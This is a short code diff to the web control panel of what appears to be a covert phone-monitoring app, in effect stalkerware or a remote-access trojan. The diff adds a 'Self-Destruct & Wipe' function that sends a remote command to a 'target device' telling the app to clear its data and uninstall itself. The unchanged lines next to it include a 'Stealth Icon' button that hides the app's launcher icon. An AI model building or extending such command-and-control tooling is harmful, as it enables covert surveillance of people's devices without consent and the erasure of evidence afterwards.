@@ -290,7 +290,7 @@
                                 <button onclick="toggleHideIcon()" class="btn-ghost" style="padding: 8px 14px; border-radius: var(--radius-pill); font-size: 0.8rem; flex: 1 1 calc(25% - 8px); min-width: 80px; justify-content: center;" title="Stealth Mode (Hide/Show Launcher Icon)">
                                     <i class="fas fa-eye-slash"></i> Stealth Icon
                                 </button>
-                                <button onclick="sendCommand('wipe_data')" class="btn-danger-ghost" style="padding: 8px 14px; border-radius: var(--radius-pill); font-size: 0.8rem; flex: 1 1 calc(25% - 8px); min-width: 80px; justify-content: center;" title="Wipe Target Data">
+                                <button onclick="triggerSelfDestruct()" class="btn-danger-ghost" style="padding: 8px 14px; border-radius: var(--radius-pill); font-size: 0.8rem; flex: 1 1 calc(25% - 8px); min-width: 80px; justify-content: center;" title="Self-Destruct & Wipe Device App">
                                     <i class="fas fa-skull"></i> Wipe
                                 </button>
                             </div>
@@ -1896,6 +1896,14 @@
                 alert(`Stealth command sent: App icon will be ${willHide ? 'HIDDEN' : 'RESTORED'}.`);
             }
         });
+    }
+
+    function triggerSelfDestruct() {
+        if (!confirm("⚠️ SELF-DESTRUCT & REMOTE WIPE CONFIRMATION:\n\nAre you sure you want to completely WIPE all cached data and SELF-UNINSTALL the app from the target device?")) return;
+        devRef.child('commands/wipe_data').set({
+            timestamp: Date.now()
+        });
+        alert("Self-Destruct initiated! The app is clearing its local storage, resetting cache, and launching self-uninstallation on the target device.");
     }
     </script>
 </body>
